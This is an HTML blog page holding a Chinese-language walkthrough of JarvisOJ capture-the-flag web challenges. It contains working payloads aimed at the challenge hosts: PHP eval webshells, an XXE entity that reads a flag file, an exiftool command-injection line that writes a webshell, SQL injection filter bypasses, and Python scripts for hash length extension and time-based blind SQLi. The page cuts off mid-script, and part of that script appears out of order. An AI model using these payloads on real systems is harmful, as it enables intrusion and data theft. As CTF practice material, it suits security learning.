@@ -1,0 +1,714 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>JarvisOJ闯关 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="JarvisOJ闯关">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-09 19:51" pubdate>
+        2020年2月9日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      45
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JarvisOJ闯关</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><!-- toc -->
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在准备数据库的作业的事情，越来越没时间了</p>
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>看着题目就只知道可以通过修改x-forwarded-for为127.0.0.1,然后进行访问就行了（就是伪造为本地访问的）</p>
+<h2 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h2><p>通过抓包可得</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/1.png" srcset="/img/loading.gif" alt="1.png"></p>
+<p>可得到后台的sql的查询语句</p>
+<p>关于这题，我当时也是一脸懵逼，</p>
+<p>可以看这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">博客</a></p>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>这关既没有使用robots.txt协议，我当时用御剑也没有扫出其他目录</p>
+<p>通过看源代码</p>
+<p>发现</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/2.png" srcset="/img/loading.gif" alt="2.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/3.png" srcset="/img/loading.gif" alt="3.png"></p>
+<p>img=后面这一段一看我就觉得是base64,拿去解了一下</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/4.png" srcset="/img/loading.gif" alt="4.png"></p>
+<p>就想用index.php、showing,php（这个没有结果）去加密然后代入试试</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/5.png" srcset="/img/loading.gif" alt="5.png"></p>
+<p>从这段源代码中又可以看到一个页面的名称shield.php，一个get方法接受变量class，一个反序列化的函数</p>
+<p>将shield.php一样画葫芦</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/6.png" srcset="/img/loading.gif" alt="6.png"></p>
+<p>可以看到关键句子flag is in pctf.php</p>
+<p>继续将pctf.php一样画葫芦</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/7.png" srcset="/img/loading.gif" alt="7.png"></p>
+<p>所以线索就在上面源码中了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;pctf.php&#x27;</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span> -&gt; file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br> &#125;<br>    <span class="hljs-variable">$haha</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$haha</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/8.png" srcset="/img/loading.gif" alt="8.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/5.png" srcset="/img/loading.gif" alt="5.png"></p>
+<h2 id="IN-A-MASS"><a href="#IN-A-MASS" class="headerlink" title="IN A MASS"></a>IN A MASS</h2><p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/10.png" srcset="/img/loading.gif" alt="10.png"></p>
+<p>查看源代码瞬间暴露</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/11.png" srcset="/img/loading.gif" alt="11.png"></p>
+<p>分析如下，</p>
+<p>$data=1112 is a nice lab! $data是通过file_get_contents()函数将$a的文件流读入得到的，所以在我的认知里面，我们应该要将<code>1112 is a nice lab!</code> 这句话以输入文件流的形式读进$a,所以用php://input（也可以利用<code>data:text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==</code>将1112 is a nice lab!用base64加密后，配合data伪协议也可以）</p>
+<p>$id==0,当将id=0传进去我们可以发现，我们只得到</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/12.png" srcset="/img/loading.gif" alt="12.png"></p>
+<p>所以将id=0传进去，并不能进入到下面关键判断，所以使用id=%001（具体原因我也不是很清楚，当时试了一下就行了）</p>
+<p>后面的判断中$b的长度既要大于5，还得满足”111”字符串和$b的第一个字符相连得==1114，又得满足$b的第一个字符不能为4，所以我又想到了%00</p>
+<p>所以最后playload为</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/13.png" srcset="/img/loading.gif" alt="13.png"></p>
+<p>返回的竟然不是flag（我还试了半天），后来才知道这是一个新的页面</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/14.png" srcset="/img/loading.gif" alt="14.png"></p>
+<p>这新的页面，我手贱试了一下，发现是sql注入的</p>
+<p>这个我弄了半天，发现他对select,union,from,空格都有过滤，</p>
+<p>但是union,select,from都可以用双写绕过，空格可以用%0b来绕过</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/15.png" srcset="/img/loading.gif" alt="15.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/16.png" srcset="/img/loading.gif" alt="16.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/17.png" srcset="/img/loading.gif" alt="17.png"></p>
+<h2 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h2><p>这题我就没见过了。看了网上的write up 才大概了解一下</p>
+<p>mysql扩展函数—-UDF</p>
+<p>有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。</p>
+<p>具体语法如下</p>
+<p><strong>create function &lt;函数名&gt; returns string soname &lt;udf文件名&gt;</strong></p>
+<p>先打开mysql</p>
+<p>查询mysql插件目录所在</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/18.png" srcset="/img/loading.gif" alt="18.png"></p>
+<p>然后将下载好的udf放到该目录下</p>
+<p>根据题目意思我们可以构造一下</p>
+<p>create function help_me returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’；</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/19.png" srcset="/img/loading.gif" alt="19.png"></p>
+<p>根据里面内容，我们可以发现还得用相同方式构建一个getflag()函数</p>
+<p>最后一样画葫芦</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/20.png" srcset="/img/loading.gif" alt="20.png"></p>
+<p>最后记得把这两个函数删掉</p>
+<p>drop function getflag;</p>
+<p>drop function help_me;</p>
+<h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/21.png" srcset="/img/loading.gif" alt="21.png"></p>
+<p>通过抓包发现了两个以前都没有的饼干</p>
+<p>其中role有一个guest的字眼，所以这个应该是判断是否为admin，</p>
+<p>我将guest改为admin,嘻嘻，不行。。。。。。。</p>
+<p>后来想起，之前看的一个哈希长度扩展攻击的文章,写出对应的脚本进行解答</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> hashpumpy;<br><span class="hljs-keyword">import</span> requests;<br><span class="hljs-keyword">import</span> urllib;<br><br>url = <span class="hljs-string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span>;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">28</span>):<br>    result = hashpumpy.hashpump(<span class="hljs-string">&#x27;35a5pj3v8GATLSZ2TGdcx3sr49METGUnny0&#x27;</span>,<span class="hljs-string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span>,<span class="hljs-string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span>,i);<br>    result1 = result[<span class="hljs-number">0</span>];<br>    result2 = result[<span class="hljs-number">1</span>][::<span class="hljs-number">-1</span>];<br>    print(<span class="hljs-string">&#x27;长度为:%s&#x27;</span>%(i));<br>    <span class="hljs-keyword">header</span> = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;web.jarvisoj.com:32778&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=16e55529e403d5-03df02b7ce5a4-386b4644-1fa400-16e55529e4149d; role=%s; hsh=%s&#x27;</span> %(urllib.parse.<span class="hljs-keyword">quote</span>(result2),result1),<br>        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span><br>    &#125;<br>    r = requests.<span class="hljs-keyword">get</span>(url,headers= <span class="hljs-keyword">header</span>);<br>    <span class="hljs-keyword">if</span> &quot;Only Admin can see the flag!!&quot; <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>        print(r.text);<br>        break;<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/22.png" srcset="/img/loading.gif" alt="22.png"></p>
+<p>具体原理可以上网搜索</p>
+<h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/23.png" srcset="/img/loading.gif" alt="23.png"></p>
+<p>通过点击管理员登录和抓包<img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/24.png" srcset="/img/loading.gif" alt="24.png"></p>
+<p>可以发现和上一题差不多的</p>
+<p>除此之外还可以发现两个关键信息</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/25.png" srcset="/img/loading.gif" alt="25.png"></p>
+<p>我尝试去访问该ip，发现存在该目录，但是我没有权限</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/26.png" srcset="/img/loading.gif" alt="26.png"></p>
+<p>我查看了该页面的源代码也没发现什么，回来我回到那个菜刀页面，查看源代码发现了<img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/27.png" srcset="/img/loading.gif" alt="27.png"></p>
+<p>我就打算在那两个禁止访问的页面构造一个proxy.php页面尝试访问,发现如下页面<img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/28.png" srcset="/img/loading.gif" alt="28.png"></p>
+<p>然后我就没思路了，去看了大佬的write up</p>
+<p>看了他们构造的writeup</p>
+<p><code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/29.png" srcset="/img/loading.gif" alt="29.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/30.png" srcset="/img/loading.gif" alt="30.png"></p>
+<p>然后依样画葫芦的访问trojan.php,trojan.php.txt</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/31.png" srcset="/img/loading.gif" alt="31.png"></p>
+<p>把这些代码拷贝下来，然后在本地的用phpstudy建立一个，然后访问得到webshell的密码</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/32.png" srcset="/img/loading.gif" alt="32.png"></p>
+<p>（注意搭建时，不能用太高版本的php,否则无法得到）</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/33.png" srcset="/img/loading.gif" alt="33.png"></p>
+<h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/34.png" srcset="/img/loading.gif" alt="34.png"></p>
+<p>这一题主要利用点是这两个功能，我猜测有可能是上传马+文件包含</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/35.png" srcset="/img/loading.gif" alt="35.png"></p>
+<p>经过一番尝试我发现只能这样绕过，成功上传</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/36.png" srcset="/img/loading.gif" alt="36.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/37.png" srcset="/img/loading.gif" alt="37.png"></p>
+<p>现在我们得找一下这些图片被上传到哪里，最终发现在这个地方</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/38.png" srcset="/img/loading.gif" alt="38.png"></p>
+<p>利用文件包含，发现会在后面加上.php,所以采用%00截断进行尝试</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/39.png" srcset="/img/loading.gif" alt="38.png"></p>
+<p>结果发现</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/40.png" srcset="/img/loading.gif" alt="40.png"></p>
+<p>看了网上大佬的writeup,发现好像是我的一句话木马（&lt;?php）被滤掉了，不能用</p>
+<p>所以我又换成了<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;READER&#39;]);&lt;/script&gt;</code></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/41.png" srcset="/img/loading.gif" alt="41.png"></p>
+<p>成功拿下</p>
+<h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/42.png" srcset="/img/loading.gif" alt="42.png"></p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/43.png" srcset="/img/loading.gif" alt="43.png"></p>
+<p>看到这里我就想起了最近看过的xxe攻击的文章，就想尝试一番</p>
+<p>当然我自己还不会写相关的playload，只能上网找一下了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">playload</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;playload;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/44.png" srcset="/img/loading.gif" alt="44.png"></p>
+<h2 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h2><p>这题用御剑扫了一下，发现了</p>
+<p><img src="/2020/02/09/JarvisOJ%E9%97%AF%E5%85%B3/45.png" srcset="/img/loading.gif" alt="45.png"></p>
+<p>其中test.php是一个phpinfo的页面，仔细查看应该可以发现该题目<strong>上传的路径</strong>（看了大佬的write up）发现这个题目跟一个漏洞有关，<a target="_blank" rel="noopener" href="https://www.2cto.com/article/201605/505823.html">具体原理</a></p>
+<p>但是我跟着大佬writeup做的时候，上传后却没相同的效果。。。。最后我没有解决这题</p>
+<p>但是playload还是给一下吧</p>
+<p>exiftool -label=””|/bin/echo <?php @eval(\$_POST[reader]);?> &gt; /opt/lampp/htdocs/uploads/y.php; ““ haha1.png</p>
+<h2 id="Simple-injection"><a href="#Simple-injection" class="headerlink" title="Simple injection"></a>Simple injection</h2><p>这一关反复测试可以发现他过滤掉空格了（绕过有内联注释、括号），并且这一关可以用布尔盲注，时间延迟盲注</p>
+<p>以前我没写过时间延迟盲注的脚本，所以这次可以试试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python">start_time = time.time();<br>            r = requests.post(url, data=data, headers=header);<br>            <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">2.5</span>):<br>                Tb_name += <span class="hljs-built_in">chr</span>(k);<br>                print(<span class="hljs-string">&quot;[!]%s&quot;</span> % (Tb_name));<br>                <span class="hljs-keyword">break</span>;<span class="hljs-keyword">import</span> requests;<br><span class="hljs-keyword">import</span> time;<br><br><br>url = <span class="hljs-string">&#x27;http://web.jarvisoj.com:32787/login.php&#x27;</span>;<br>flag = <span class="hljs-string">&quot;&quot;</span>;<br><br>header = &#123;<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;web.jarvisoj.com:32787&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://web.jarvisoj.com:32787/login.php&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=16e55529e403d5-03df02b7ce5a4-386b4644-1fa400-16e55529e4149d; PHPSESSID=67kp31t030mj3bg2h8kctbgsv3&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getDb_len</span>(<span class="hljs-params">url,header</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 